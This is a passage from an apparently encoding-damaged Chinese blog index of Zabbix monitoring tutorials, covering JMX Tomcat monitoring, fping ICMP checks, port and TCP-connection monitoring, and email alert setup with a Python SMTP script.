1374/ntpd é‡å¯zabbix agent 1service zabbix-agent restart æ³¨ï¼šé˜²ç«å¢™éœ€è¦å¼€æ”¾12345ï¼Œ12346ç«¯å£ 12-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 12345 -j ACCEPT-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 12346 -j ACCEPT ###4ã€æœåŠ¡ç«¯æµ‹è¯•æ˜¯å¦å¯ä»¥è·å–æ•°æ® å‘½ä»¤è¡Œä¸‹æµ‹è¯•éœ€è¦cmdline-jmxclient-0.10.3.jarè¿™ä¸ªåŒ…ï¼Œæµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š è¿™ä¸ªåŒ…ä¸‹è½½åœ°å€:cmdline-jmxclient-0.10.3.jar åœ¨zabbix serverä¸Šæ‰§è¡Œ 1java -jar /tmp/cmdline-jmxclient-0.10.3.jar - 192.168.7.186:12345 java.lang:type=Memory NonHeapMemoryUsage å¦‚æœæœ‰å¦‚ä¸‹å›æ˜¾è¡¨ç¤ºjmxé…ç½®æ­£ç¡®ï¼Œå¦‚ä¸æ­£ç¡®ï¼Œè¯·æ£€æŸ¥é…ç½®,çœ‹ä¸‹ç«¯å£å¯åŠ¨æ˜¯å¦æ­£å¸¸ï¼Œserver.xml é…ç½®ã€‚ 1234507/22/2016 14:45:28 +0800 org.archive.jmx.Client NonHeapMemoryUsage:committed: 80347136init: 24576000max: 136314880used: 46634984 å†™ä¸ªè„šæœ¬è‡ªåŠ¨åˆ¤æ–­ï¼š 123vim context.sh#!/bin/bashjava -jar /opt/tomcat/cmdline-jmxclient-0.10.3.jar - 10.46.72.172:12345 Catalina:type=Manager,*| awk -F \",\" '&#123; print $1 &#125;'|awk -F: '&#123; print $2 &#125;'&gt;/tmp/tomcat/context.csv ä¸‰ã€å¯¼å…¥æ¨¡æ¿åˆ°zabbixï¼Œå¹¶å…³è”åˆ°ä¸»æœºï¼Œæ·»åŠ ç›‘æ§è¿™æ ·ä¹Ÿå¯ä»¥é€‰æ‹©ç³»ç»Ÿè‡ªå¸¦çš„ï¼Œæˆ‘è¿™é‡Œzabbixç‰ˆæœ¬æ˜¯3.0çš„ï¼Œç³»ç»Ÿè‡ªå¸¦çš„å¯ä»¥é€‰æ‹©ï¼šé€‰æ‹©é…ç½®ï¼šä¸»æœº-æ¨¡æ¿-é€‰æ‹©-æ¨¡æ¿-ï¼šTemplate JMX TomcatTemplate JMX Generic ä»ç½‘ä¸Šä¸‹è½½äº†ä¸€ä¸ªä¸é”™çš„æ¨¡æ¿ï¼Œå¯¼å…¥åå¦‚ä¸‹ï¼š å¯¼å…¥æ¨¡æ¿ä»¥åä¸»æœºæ·»åŠ ç«¯å£ï¼š ç„¶åæŸ¥çœ‹å›¾å½¢ï¼š å°±æœ‰äº†ã€‚ å››ã€å¦‚ä½•ç›‘æ§å•ä¸»æœºå¤šä¸ªtomcatç›‘æ§å¤šä¸ªtomcatå®ä¾‹ï¼Œç½‘ä¸Šçš„è¯¦ç»†çš„é…ç½®æ–‡æ¡£å¾ˆå°‘ï¼Œå‡ ä¹æ²¡æœ‰ã€‚æ¯”è¾ƒå¥½çš„åŠæ³•æ˜¯ä½¿ç”¨è‡ªåŠ¨å‘ç°ï¼Œä½†åˆšä½¿ç”¨zabbixï¼Œæ¥ä¸åŠç ”ç©¶ï¼Œæ‰€ä»¥é‡‡ç”¨ç¬¨æ³•ï¼Œä¿®æ”¹æ¨¡æ¿ã€ç›‘æ§é¡¹ã€å›¾å½¢æ¥è¾¾åˆ°æœ€ç»ˆç›®çš„ã€‚å…³é”®é…ç½®ï¼š1ã€æ·»åŠ ä¸»æœºæ—¶æ·»åŠ å¤šä¸ªjmxç«¯å£ 2ã€ä¿®æ”¹ç›‘æ§é¡¹ã€é”®å€¼åœ¨åŒä¸€ä¸»æœºä¸Šï¼Œzabbixä¸å…é”®å€¼é‡å¤ï¼Œä½†æ˜¯ç›‘æ§çš„é¡¹ç›®æ˜¯ä¸€æ ·çš„ï¼Œä¸å¯èƒ½é”®å€¼å†™çš„ä¸é‡å¤ï¼Œç»è¿‡å‡ ç•ªæœç´¢ï¼Œæ‰¾åˆ°æ–¹æ³•å¦‚ä¸‹ï¼šåªè¦åœ¨ç®­å¤´å¤„æ·»åŠ 1ä¸ªç©ºæ ¼å°±å¯ä»¥ï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªã€‚ï¼ˆæ³¨æ„ä½ç½®ä¸è¦é”™ï¼Œåœ¨é€—åˆ°åé¢ï¼‰ å‰©ä¸‹çš„å°±æ˜¯ä½“åŠ›æ´»äº†ï¼Œå…‹éš†ç›‘æ§é¡¹ã€ä¿®æ”¹ç›‘æ§é¡¹ã€å…‹éš†å›¾å½¢ã€ä¿®æ”¹å›¾å½¢ã€‚ã€‚ã€‚ä»¥ä¸‹æ˜¯ä¸¤ä¸ªtomcatå®ä¾‹çš„ç›‘æ§é¡¹ï¼š å¤šä¸ªtomcatåœ¨ä¸€å°ä¸»æœºä¸Šé¢æœ€åçš„ç›‘æ§æ•ˆæœå¦‚ä¸‹ï¼š ä¸€å¼€å§‹zabbixç›‘æ§tomcat ä¸€è·¯é¡ºç•…ï¼Œå¯æ˜¯åˆ°æµ‹è¯•æ­£ä¸æ­£å¸¸æ—¶å€™ï¼Œè¿”å›æ‹’ç»è¿æ¥ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°å°±æ˜¯é…ç½®æœ‰é—®é¢˜ï¼š æˆ‘æ˜¯å‚è€ƒè¿™ä¸ªè§£å†³äº†ã€‚ å…·ä½“å‚æ•°å†…å®¹è¯·å‚è€ƒ apache tomcat æ–‡æ¡£ ä¹Ÿéå¸¸æ„Ÿè°¢ï¼šå¼ çˆ±å¾·å¤§ç¥ ä¸€è·¯zabbixä¸Šé¢çš„å¸®æˆ‘ä¸€èµ·æ’å‘ï¼š zabbixå¤§ç¥ ä»–çš„åšå®¢blogï¼šhttps://blog.cactifans.com","link":"/2016/06/21/æ€§èƒ½ç›‘æ§/Zabbix/zabbix3-0éƒ¨ç½²jmxç›‘æ§tomcat/"},{"title":"zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§","text":"ä¸Šä¸€æ¬¡æ­å»ºäº†é‚®ä»¶å‘Šè­¦å’Œå¾®ä¿¡å‘Šè­¦ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åŠæ—¶æ¥æ”¶åˆ°å‘Šè­¦çš„ã€‚è¿™é‡Œè®²zabbixé‡Œé¢ICMP-pingæ¨¡æ¿çš„å®ç°ç½‘ç»œç›‘æ§ã€‚ Zabbixä½¿ç”¨å¤–éƒ¨å‘½ä»¤fpingå¤„ç†ICMP pingçš„è¯·æ±‚ï¼Œfpingä¸åŒ…å«åœ¨zabbixçš„å‘è¡Œç‰ˆæœ¬ä¸­ï¼Œéœ€è¦é¢å¤–å»ä¸‹è½½å®‰è£…fpingç¨‹åºï¼Œå®‰è£…å®Œæ¯•ä¹‹åéœ€è¦åœ¨zabinx_server.confä¸­çš„å‚æ•°FpingLocationé…ç½®fpingå®‰è£…çš„è·¯å¾„ã€‚ ç”±äºfpingé»˜è®¤æ˜¯rootæƒé™å·¥ä½œï¼Œè€Œzabbix-serveræ˜¯zabbixç”¨æˆ·è¿è¡Œçš„ï¼Œæ‰€ä»¥éœ€è¦å¯¹fpingç¨‹åºè®¾ç½®setuidæƒé™ï¼Œå¦‚æœåœ¨è‡ªå®šä¹‰keyçš„æ—¶å€™éœ€è¦ç”¨åˆ°netstatå‘½ä»¤ï¼Œä¹ŸåŒæ ·è¦è®¾ç½®setuidï¼Œå¦åˆ™ä¸èƒ½è·å–åˆ°æ•°æ®ï¼Œè€Œåœ¨æ—¥å¿—ä¸­æç¤ºæƒæ‹’ç»ã€‚ ä¸€ã€ç™»é™†ZabbixæœåŠ¡å™¨åšä»¥ä¸‹æ“ä½œï¼š1.fpingå®‰è£… 12345wget http://www.fping.org/dist/fping-3.10.tar.gztar zxvf fping-3.10.tar.gzcd fping-3.10./configure --prefix=/usr/local/fping/make &amp;&amp; make install 2.ä¿®æ”¹zabbix_server.confé…ç½®æ–‡ä»¶ 12345vim /usr/local/zabbix/etc/zabbix_server.confæŠŠFpingLocationè·¯å¾„ä¿®æ”¹ä¸ºåˆšå®‰è£…çš„fpingè·¯å¾„ã€‚FpingLocation=/usr/local/fping/sbin/fping å¦‚æœä¸ä¿®æ”¹zabbix_server.confé…ç½®ä»¶éœ€è¦ä½¿ç”¨è½¯è¿æ¥åˆ°/usr/local/sbin/fpingï¼Œzabbixé»˜è®¤fpingçš„è·¯å¾„æ˜¯/usr/sbin/fping 12ln -s /usr/sbin/fping /path/to/non-existant/fpingln -s /usr/sbin/fping6 /path/to/non-existant/fping6 3.ä¿®æ”¹fpingæƒé™ï¼ˆå¦‚æœä¸è®¾ä¸‹é¢æƒé™ï¼ŒzabbixæœåŠ¡ç«¯ä¼šé‡‡é›†ä¸åˆ°æ•°æ®ï¼‰ 12# chown root:zabbix /usr/local/fping/sbin/fping# chmod 4710 /usr/local/fping/sbin/fping å®‰è£…å®Œfpingï¼Œè®¾ç½®å¥½zabbix-server é…ç½®æ–‡ä»¶ï¼Œéœ€è¦é‡å¯æœåŠ¡ã€‚ 1service zabbix_server restart #é‡å¯æœåŠ¡ 4.zabbixç”¨æˆ·æµ‹è¯•fpingå‘½ä»¤ 12/usr/local/fping/sbin/fping www.baidu.comwww.baidu.com is alive # è¯´æ˜å‘½ä»¤è¿”å›æˆåŠŸã€‚ äºŒã€ç™»é™†Zabbixç›‘æ§ç½‘é¡µåšä»¥ä¸‹è®¾ç½®æ‰“å¼€zabbix-configuration-host-creat 1.hostæ·»åŠ éœ€è¦ç›‘æ§çš„ipåœ°å€,è¿™é‡Œå°±ä¸ä»‹ç»äº†ã€‚ 2.é€‰æ‹©æ¨¡ç‰ˆtemplate icmp ping 3.æ·»åŠ Graphs æ·»åŠ å®Œä»¥åå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„æœºå™¨å›¾å½¢ï¼š å››ã€è§¦å‘å™¨æ¨¡ç‰ˆå·²è‡ªå¸¦ï¼Œè®¾ç½®æŠ¥è­¦æ–¹å¼åå°±å¯ä»¥æ¥æ”¶æŠ¥è­¦é‚®ä»¶äº†ã€‚ zabbix-server2.4æœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix-serveræœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix2.4ç›‘æ§80ç«¯å£çŠ¶æ€ : zabbixç›‘æ§80ç«¯å£çŠ¶æ€ zabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ ï¼šzabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ : zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ : zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“","link":"/2014/10/01/æ€§èƒ½ç›‘æ§/Zabbix/zabbixçš„ICMP-Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§/"},{"title":"zabbixç›‘æ§80ç«¯å£çŠ¶æ€","text":"ç›®çš„ï¼šç›‘æ§webä¸»æœº80ç«¯å£æ˜¯å¦åœ¨ä¾›ææœåŠ¡ã€‚å¦‚æœä¸åœ¨å‘å‡ºæŠ¥è­¦ã€‚zabbixç›‘æ§webç«¯ä¸Šé¢çš„80ç«¯å£ï¼Œæˆ–è€…å…¶ä»–çš„ç«¯å£éƒ½æ˜¯å¯ä»¥å®ç°çš„ã€‚ åœ¨è¿™é‡Œå¯ä»¥æ·»åŠ è‡ªå¸¦çš„æ¨¡æ¿-ç»„æ€-æ¨¡æ¿-Template App HTTP Service æœ‰è‡ªå¸¦çš„HTTP service is running æœåŠ¡æ˜¯å¦æ­£å¸¸å¯åŠ¨ã€‚ è¿™ä¸ªæ˜¯ç›‘æµ‹httpçš„80ç«¯å£ï¼ŒåæœŸæ¯”å¦‚nginxï¼Œgitlab,æˆ–è€…å…¶ä»–æœåŠ¡çš„80ç«¯å£ã€‚å¯ä»¥å¯¹å•å°è®¾ç½®ã€‚ ä¹Ÿå¯ä»¥åˆ›å»ºæ¨¡æ¿æ­£å¯¹æ€§çš„ç›‘æ§é›†ç¾¤çš„åŒä¸€ä¸ªç«¯å£ã€‚ é…ç½®ï¼š 1ã€æ·»åŠ ç›‘æ§é¡¹(Items) 12 æ‰“å¼€zabbix webç®¡ç†ç•Œé¢ï¼šé€‰æ‹©\"Configuration\"-&gt;\"Hosts\"-è¿™é‡Œé€‰æ‹©éœ€è¦ç›‘æ§çš„æœºå™¨-\"Items\" é€‰æ‹©Create-item åˆ›å»ºé¡¹ç›®ï¼Œè¿™ä¸ªå¯¹è¿™å°ç›‘æ§çš„æœåŠ¡å™¨åˆ›å»ºå¯¹åº”çš„ç›‘æ§é¡¹ç›®ã€‚ åœ¨è¿™é‡Œâ€nameâ€ä¸ºâ€web01.haozhuo 80â€ï¼Œè®¾ç½®â€keyâ€ç‚¹å‡»â€Selectâ€æŒ‰é’®å¼¹å‡ºä¸‹å›¾é€‰æ‹©â€net.tcp.port[,port]â€,ç„¶åä¿®æ”¹ä¸ºweb01çš„ipåœ°å€ç«¯å£ä¸º80ã€‚â€net.tcp.port[192.168.0.2,80]â€ ä¿å­˜ 2ã€æ·»åŠ è§¦å‘å™¨ï¼ˆTriggersï¼‰é€‰æ‹©Configurationâ€-&gt;â€Hostsâ€-è¿™é‡Œé€‰æ‹©éœ€è¦ç›‘æ§çš„æœºå™¨-â€œTriggersâ€ é€‰æ‹©Create-Trigger ä¿å­˜ ç„¶åé€‰æ‹©æ·»åŠ å›¾å½¢ã€‚ zabbix-server2.4æœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix-serveræœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix2.4ç›‘æ§80ç«¯å£çŠ¶æ€ : zabbixç›‘æ§80ç«¯å£çŠ¶æ€ zabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ ï¼šzabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ : zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ : zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“","link":"/2014/10/06/æ€§èƒ½ç›‘æ§/Zabbix/zabbixç›‘æ§80ç«¯å£çŠ¶æ€/"},{"title":"zabbixç›‘æ§tcpè¿æ¥æ•°","text":"ç³»ç»Ÿç¯å¢ƒ: CentOS release 6.7 (Final) zabbix.3.0.3 zabbix-serverç«¯ï¼šé¦–å…ˆåˆ›å»ºè„šæœ¬ Shell 12mkdir /usr/local/zabbix/scripts[root@zabbix scripts]# vim /usr/local/zabbix/scripts/tcp_connections.sh scriptï¼š 1234567891011121314151617181920212223242526272829303132#!/bin/bash stat() &#123; netstat -an | awk '/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;' &#125; case $1 in TIME_WAIT) stat |grep 'TIME_WAIT' |awk '&#123;print $2&#125;' ;; CLOSE_WAIT) stat | grep 'CLOSE_WAIT' |awk '&#123;print $2&#125;' ;; FIN_WAIT1) stat | grep 'FIN_WAIT1' |awk '&#123;print $2&#125;' ;; ESTABLISHED) stat | grep 'ESTABLISHED' |awk '&#123;print $2&#125;' ;; SYN_RECV) stat |grep 'SYN_RECV' |awk '&#123;print $2&#125;' ;; LAST_ACK) stat |grep 'LAST_ACK' |awk '&#123;print $2&#125;' ;; LISTEN) stat |grep 'LISTEN' |awk '&#123;print $2&#125;' ;; *) echo \"Usage: TIME_WAIT CLOSE_WAIT FIN_WAIT1 ESTABLISHED SYN_RECV LAST_ACK LISTEN\" ;;esac æµ‹è¯•è„šæœ¬æ˜¯å¦å¯ç”¨ 123[root@zabbix scripts]# chmod +x tcp_connections.sh[root@zabbix scripts]# ./tcp_connections.sh ESTABLISHED59 zabbix-agentç«¯ï¼š1[root@zabbix scripts]# vim /usr/local/zabbix/etc/zabbix_agentd.conf.d/monitor_tcp_connections.conf ç¼–è¾‘serverç«¯zabbix_agentdé…ç½® 1234567UserParameter=tcp.time_wait,/usr/local/zabbix/scripts/tcp_connections.sh TIME_WAITUserParameter=tcp.close_wait,/usr/local/zabbix/scripts/tcp_connections.sh CLOSE_WAITUserParameter=tcp.fin_wait1,/usr/local/zabbix/scripts/tcp_connections.sh FIN_WAIT1UserParameter=tcp.established,/usr/local/zabbix/scripts/tcp_connections.sh ESTABLISHEDUserParameter=tcp.syn_recv,/usr/local/zabbix/scripts/tcp_connections.sh SYN_RECVUserParameter=tcp.last_ack,/usr/local/zabbix/scripts/tcp_connections.sh LAST_ACKUserParameter=tcp.listen,/usr/local/zabbix/scripts/tcp_connections.sh LISTEN é‡å¯æœåŠ¡123[root@zabbix scripts]# /etc/init.d/zabbix_agentd restartShutting down zabbix_agentd: [ç¡®å®š]Starting zabbix_agentd: [ç¡®å®š] æµ‹è¯•ç›‘æ§æ˜¯å¦æœ‰æ•°æ®12/usr/local/zabbix/bin/zabbix_get -s localhost -k tcp.establishedZBX_NOTSUPPORTED: Unsupported item key. å‡ºç°è¿™ä¸ªé”™è¯¯ï¼Œæç¤ºæˆ‘keyå€¼æœ‰é—®é¢˜ã€‚æ‰€ä»¥æˆ‘æ£€æŸ¥äº†ä¸‹é…ç½®ã€‚ æ·»åŠ äº†ä¸€æ¡ç›®å½•ã€‚ 12vim /usr/local/zabbix/etc/zabbix_agentd.confInclude=/usr/local/zabbix/etc/zabbix_agentd.conf.d/*.conf ç„¶åæµ‹è¯•ï¼š 12[root@zabbix scripts]# /usr/local/zabbix/bin/zabbix_get -s localhost -k tcp.established64 ç„¶ååœ¨webé‡Œåˆ›å»ºæ¨¡ç‰ˆï¼Œæ–¹ä¾¿ä»¥åå¤šå°æ·»åŠ  é€‰æ‹©é…ç½®-æ¨¡æ¿-å³ä¸Šè§’.åˆ›å»ºæ¨¡æ¿ å¡«å†™æ¨¡ç‰ˆåç§° åˆ›å»ºç›‘æ§é¡¹ å¯ä»¥å…‹éš†åˆ›å»ºç›‘æ§é¡¹ã€‚ åˆ›å»ºå›¾å½¢ æ¨¡ç‰ˆåˆ›å»ºå®Œæˆåï¼Œè¦å…³è”åˆ°ç›‘æ§ä¸»æœº ç‚¹å‡»ä¸»æœºï¼Œé€‰æ‹©æ¨¡ç‰ˆ ç­‰ä¸€ä¼šå„¿æ•°æ®å›¾å½¢å°±ä¼šå‡ºç° å…¶ä»–æœºå™¨ä¹Ÿæ˜¯ä¸€æ ·ç›´æ¥æ·»åŠ æ¨¡æ¿å³å¯ã€‚åœ¨agentdä¸‹é¢æ·»åŠ keyé”®å€¼é‡å¯æœåŠ¡å°±è¡Œã€‚ å¯å‚è€ƒï¼š zabbixç›‘æ§tcpè¿æ¥æ•° zabbix-server2.4æœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix-serveræœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix2.4ç›‘æ§80ç«¯å£çŠ¶æ€ : zabbixç›‘æ§80ç«¯å£çŠ¶æ€ zabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ ï¼šzabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ : zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ : zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“","link":"/2016/06/21/æ€§èƒ½ç›‘æ§/Zabbix/zabbixç›‘æ§tcpè¿æ¥æ•°/"},{"title":"zabbixé‚®ä»¶å‘Šè­¦","text":"æ“ä½œç³»ç»Ÿç¯å¢ƒï¼šCentOS release 6.7 (Final) zabbixç‰ˆæœ¬2.4.7 å…³äºæ“ä½œç³»ç»ŸCentOS6.0 ä»¥ä¸‹ç‰ˆæœ¬éƒ½æ˜¯é€šè¿‡mailå‘½ä»¤è°ƒç”¨sendmailçš„sm-clientå‘é€é‚®ä»¶ï¼Œæ‰€ä»¥å¦‚æœå…³é—­sendmailæŒ‰ç…§å¾ˆå¤šç½‘ä¸Šçš„æ–‡æ¡£æ˜¯å‘ä¸å‡ºé‚®ä»¶çš„ã€‚ centos 6.0ä»¥ä¸Šç‰ˆæœ¬ 12é»˜è®¤å·²ç»å®‰è£…å¥½sendmailé»˜è®¤å·²ç»å®‰è£…å¥½postfix sendmailå’Œpostfixåªéœ€è¦å®‰è£…ä¸€ä¸ªå³å¯å¹¶å¼€å¯æœåŠ¡å³å¯ã€‚ å®ç°ç›®çš„ï¼šåœ¨ZabbixæœåŠ¡ç«¯è®¾ç½®é‚®ä»¶æŠ¥è­¦ï¼Œå½“è¢«ç›‘æ§ä¸»æœºå®•æœºæˆ–è€…è¾¾åˆ°è§¦å‘å™¨é¢„è®¾å€¼æ—¶ï¼Œä¼šè‡ªåŠ¨å‘é€æŠ¥è­¦é‚®ä»¶åˆ°æŒ‡å®šé‚®ç®±ï¼Œå®šä½å“ªé‡Œå‡ºç°é—®é¢˜ï¼Œå¯ä»¥åŠæ—¶çš„è§£å†³ã€‚ 1.å®‰è£…é‚®ä»¶å‘é€å·¥å…·mailxCentOS 6.x ç¼–è¯‘å®‰è£…mailxï¼Œç›´æ¥yumå®‰è£…çš„mailxç‰ˆæœ¬å¤ªæ—§ï¼Œä½¿ç”¨å¤–éƒ¨é‚®ä»¶å‘é€ä¼šæœ‰é—®é¢˜ã€‚ 123yum install mailx #å®‰è£…yum remove mailx #å¸è½½ç³»ç»Ÿè‡ªå¸¦çš„æ—§ç‰ˆmailx è¿™é‡Œæˆ‘ç”¨ç¼–è¯‘å®‰è£…çš„å¾ˆç®€å•å‡ æ­¥å°±å¯ä»¥äº†ã€‚ mailä¸‹è½½åœ°å€:Downloads 1234567891011[root@salt ~]# curl -O http://ftp.debian.org/debian/pool/main/h/heirloom-mailx/heirloom-mailx_12.5.orig.tar.gz[root@salt ~]# tar -zxvf heirloom-mailx_12.5.orig.tar.gz [root@salt ~]# cd heirloom-mailx-12.5[root@salt heirloom-mailx-12.5]# make[root@salt heirloom-mailx-12.5]# make install UCBINSTALL=/usr/bin/install[root@salt heirloom-mailx-12.5]# ln -s /usr/local/bin/mailx /bin/mail #åˆ›å»ºmailxåˆ°mailçš„è½¯è¿æ¥[root@salt heirloom-mailx-12.5]# ln -s /etc/nail.rc /etc/mail.rc #åˆ›å»ºmailxé…ç½®æ–‡ä»¶è½¯è¿æ¥[root@salt heirloom-mailx-12.5]# whereis mailx #æŸ¥çœ‹å®‰è£…è·¯å¾„mailx: /bin/mailx /usr/local/bin/mailx /usr/share/man/man1p/mailx.1p.gz /usr/share/man/man1/mailx.1.gz [root@salt heirloom-mailx-12.5]# mailx -V #æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯12.5 6/20/10 å®‰è£…å®Œä»¥åæˆ‘ä»¬æ¥æµ‹è¯•ä¸‹ï¼š 123456[root@salt]# echo \"zabbix test mail\" |mail -s zabbix\" it@hz-health.cn[root@salt]# send-mail: warning: inet_protocols: IPv6 support is disabled: Address family not supported by protocolsend-mail: warning: inet_protocols: configuring for IPv4 support onlypostdrop: warning: inet_protocols: IPv6 support is disabled: Address family not supported by protocolpostdrop: warning: inet_protocols: configuring for IPv4 support onlypostdrop: warning: unable to look up public/pickup: No such file or directory å¦‚æœæœ‰å‡ºç°è¿™ä¸ªæŠ¥é”™ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸‹é…ç½®æ–‡ä»¶ã€‚æŸ¥çœ‹å½“å‰inet_protocols 123456789# /usr/sbin/postconf | grep inet_protocolsinet_protocols = allä¿®æ”¹ipv4# vi /etc/postfix/main.cfinet_protocols = allæ”¹ä¸ºinet_protocols = ipv4é‡å¯postfixservice postfix restart ç„¶ååœ¨æµ‹è¯•ï¼š 1[root@salt]# echo \"zabbix test mail\" |mail -s \"zabbix\" it@xxxx.cn æµ‹è¯•å‘é€é‚®ä»¶ï¼Œæ ‡é¢˜zabbixï¼Œé‚®ä»¶å†…å®¹ï¼šzabbix test mailï¼Œå‘é€åˆ°çš„é‚®ç®±ï¼šxxx.qq.com è¿™æ—¶å€™ï¼Œé‚®ç®±yyy@qq.comä¼šæ”¶åˆ°æ¥è‡ªxxx@qq.comçš„æµ‹è¯•é‚®ä»¶ã€‚ 2ã€åˆ›å»ºé‚®ä»¶å‘Šè­¦çš„pythonè„šæœ¬zabbix_serveræ·»åŠ è„šæœ¬é…ç½®: zabbixå®‰è£…è·¯å¾„ï¼šcd /usr/local/zabbix/share/zabbix/alertscripts ç¼–å†™è„šæœ¬ï¼švim /usr/local/zabbix/share/zabbix/alertscripts/zabbix_sendmail.py 12345678910111213141516171819202122232425262728#!/usr/bin/env python#coding:utf-8import smtplibfrom email.mime.text import MIMETextimport sysLOG_FILENAME=\"/var/log/email_python.log\"mail_host = 'smtp.exmail.qq.com' #å®šä¹‰smtpæœåŠ¡å™¨mail_user = 'it@xxxx.cn' #å‘ä»¶äººé‚®ç®±mail_pass = 'xxxxxxx' #å‘ä»¶äººé‚®ç®±å¯†ç mail_port = 465 #smtpæœåŠ¡å™¨çš„ç«¯å£å·ï¼Œä¸åŒçš„é‚®ç®±æœåŠ¡å™¨ç«¯å£å·ä¸åŒdef send_mail(to_list,subject,content): me=\"Zabbix Monitor\"+\"&lt;\"+mail_user+\"&gt;\" #å®šä¹‰å‘ä»¶äººæ˜¾ç¤ºåç§°ä¸ºZabbix Monitor msg=MIMEText(content,_subtype='plain',_charset='gb2312') msg['Subject']=subject #å®šä¹‰é‚®ä»¶ä¸»é¢˜ msg['From']=me #å‘é€æ–¹ msg['to']=to_list #æ¥æ”¶æ–¹ try: s=smtplib.SMTP_SSL() #åˆ›å»ºä¸€ä¸ªsmtpå¯¹è±¡ s.connect(mail_host,mail_port) #é€šè¿‡connectæ–¹æ³•è¿æ¥smtpä¸»æœº s.login(mail_user,mail_pass) #é‚®ç®±è´¦æˆ·ç™»å½•è®¤è¯ s.sendmail(me,to_list,msg.as_string()) #å‘é€é‚®ä»¶ s.close() #æ–­å¼€smtpè¿æ¥ return True except Exception,e: print str(e) return Falseif __name__ == \"__main__\": send_mail(sys.argv[1],sys.argv[2],sys.argv[3]) 2ã€è„šæœ¬æ–‡ä»¶è·¯å¾„ å…ˆç¡®è®¤ä¸‹zabbix_server.confæ–‡ä»¶ä¸­å®šä¹‰çš„å‘Šè­¦è„šæœ¬è·¯å¾„é…ç½®ï¼š å¦‚æœæ³¨é‡Šäº†ï¼Œæ·»åŠ ä¸€æ¡ç»å¯¹è·¯å¾„ã€‚ 12# AlertScriptsPath=$&#123;datadir&#125;/zabbix/alertscripts AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts ç„¶åå°†å‡†å¤‡å¥½çš„pythonè„šæœ¬å­˜æ”¾åˆ°è¯¥è·¯å¾„ä¸‹ï¼Œå¹¶æ›´æ”¹è„šæœ¬æ–‡ä»¶çš„æƒé™å’Œå±ä¸»å±ç»„ 12chown zabbix.zabbix /usr/local/zabbix/share/zabbix/alertscripts/zabbix_sendmail.pychmod +x /usr/local/zabbix/share/zabbix/alertscripts/zabbix_sendmail.py æ³¨æ„ï¼šå¦‚æœåœ¨zabbix_server.confæ–‡ä»¶ä¸­æ²¡æœ‰è®¾ç½®Allow root=1ï¼Œåˆ™è¡¨ç¤ºzabbixæ˜¯ä»¥zabbixç”¨æˆ·å¯åŠ¨è€Œä¸æ˜¯rootï¼Œæ‰€ä»¥è„šæœ¬çš„å±ä¸»å±ç»„éƒ½åº”è¯¥è®¾ç½®ä¸ºzabbixç”¨æˆ·ã€‚è®¾ç½®ä¸ºrootç”¨æˆ·å¯åŠ¨çš„é…ç½®å¦‚ä¸‹ã€‚ 123456789### Option: AllowRoot# Allow the server to run as 'root'. If disabled and the server is started by 'root', the server# will try to switch to user 'zabbix' instead. Has no effect if started under a regular user.# 0 - 